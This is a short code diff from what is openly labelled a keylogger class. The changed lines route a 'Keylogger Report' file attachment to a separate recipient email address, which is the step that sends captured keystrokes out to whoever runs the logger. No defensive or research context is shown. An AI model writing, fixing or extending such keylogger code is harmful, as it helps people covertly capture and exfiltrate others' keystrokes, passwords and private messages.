@@ -52,7 +52,7 @@ class KeyloggerModel:
 
             if self.method == "file":
                 attachment = self.save_report_to_file()
-                self.email_sender.send_email(self.email_sender.email_address, 
+                self.email_sender.send_email(self.email_sender.recipient_email_address, 
                                             "Keylogger Report", 
                                             "Attached is the keylogger report.", 
                                             attachment)
